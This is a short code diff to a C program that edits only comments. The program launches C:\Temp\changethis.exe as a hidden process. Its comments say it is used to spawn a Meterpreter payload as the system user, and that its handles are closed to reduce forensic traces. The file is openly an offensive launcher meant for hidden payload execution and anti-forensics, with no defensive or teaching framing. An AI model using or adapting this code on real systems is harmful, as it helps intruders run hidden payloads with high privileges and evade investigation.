@@ -20,12 +20,12 @@ int main() {
 
     ZeroMemory(&pi, sizeof(pi));
 
-    // Run Meterpreter payload from C:\Temp
+    // spawning a process from C:\Temp folder. generally used for spawning meterpreter on system user, remember, change program name from changethis to anything
     if (!CreateProcess("C:\\Temp\\changethis.exe", NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
-        return 1;  // Exit if execution fails
+        return 1;  // exit if execution fails
     }
 
-    // Close handles to reduce forensic traces
+    // close handles to reduce forensic traces
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
 
